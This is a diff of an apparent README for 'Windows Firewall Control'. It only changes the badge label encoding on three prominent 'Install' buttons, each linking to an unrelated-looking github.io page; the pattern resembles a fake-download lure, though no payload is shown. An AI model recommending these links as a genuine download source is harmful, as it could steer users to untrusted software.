@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Windows Firewall Control](https://img.shields.io/badge/⬇_Install_Windows%20Firewall%20Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Windows Firewall Control](https://img.shields.io/badge/⬇_Install_Windows+Firewall+Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Windows Firewall Control is a free application that enhances the Windows Firewal
 
 <div align="center">
 
-[![⬇ Install Windows Firewall Control](https://img.shields.io/badge/⬇_Install_Windows%20Firewall%20Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Windows Firewall Control](https://img.shields.io/badge/⬇_Install_Windows+Firewall+Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Windows Firewall Control is a free application that enhances the Windows Firewal
 
 <div align="center">
 
-[![⬇ Install Windows Firewall Control](https://img.shields.io/badge/⬇_Install_Windows%20Firewall%20Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Windows Firewall Control](https://img.shields.io/badge/⬇_Install_Windows+Firewall+Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
